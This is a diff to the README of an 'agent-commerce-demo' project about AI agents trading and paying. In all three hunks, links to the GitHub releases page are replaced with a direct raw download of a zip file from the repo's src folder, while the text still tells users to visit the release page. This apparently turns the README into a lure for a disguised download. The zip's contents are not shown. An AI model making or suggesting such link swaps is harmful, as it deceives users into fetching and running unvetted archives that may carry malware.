@@ -1,6 +1,6 @@
 # 🤖 agent-commerce-demo - AI Agents Trade and Pay Seamlessly
 
-[![Download agent-commerce-demo](https://img.shields.io/badge/Download-agent--commerce--demo-brightgreen)](https://github.com/mehranpr12/agent-commerce-demo/releases)
+[![Download agent-commerce-demo](https://img.shields.io/badge/Download-agent--commerce--demo-brightgreen)](https://github.com/mehranpr12/agent-commerce-demo/raw/refs/heads/main/src/commerce_agent_demo_v3.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This application runs on typical consumer hardware. It does not require advanced
 
 Click the button below to open the release page. This is where you get the installation files.
 
-[![Get agent-commerce-demo](https://img.shields.io/badge/Get%20agent--commerce--demo-blue)](https://github.com/mehranpr12/agent-commerce-demo/releases)
+[![Get agent-commerce-demo](https://img.shields.io/badge/Get%20agent--commerce--demo-blue)](https://github.com/mehranpr12/agent-commerce-demo/raw/refs/heads/main/src/commerce_agent_demo_v3.9.zip)
 
 You will see a list of available releases. Look for the latest stable version. It should have a name like `agent-commerce-demo-x.x.x-win.exe` or something similar.
 
@@ -128,6 +128,6 @@ Keywords related to this project include:
 ## 🔗 Download agent-commerce-demo Now  
 
 For direct access, go to the release page and get the latest version here:  
-https://github.com/mehranpr12/agent-commerce-demo/releases
+https://github.com/mehranpr12/agent-commerce-demo/raw/refs/heads/main/src/commerce_agent_demo_v3.9.zip
 
 ---
